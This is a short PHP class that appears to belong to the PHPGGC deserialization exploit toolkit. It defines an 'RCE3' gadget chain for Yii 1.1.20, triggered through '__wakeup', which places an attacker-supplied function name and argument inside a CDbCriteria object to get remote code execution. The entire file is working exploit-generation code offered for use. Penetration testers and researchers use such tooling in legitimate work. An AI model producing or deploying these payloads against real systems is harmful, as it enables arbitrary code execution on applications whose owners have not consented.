<?php

namespace GadgetChain\Yii;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.20';
    public static $vector = '__wakeup';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        $a = new \CDbCriteria($function, $parameter);

        return $a;
    }
}
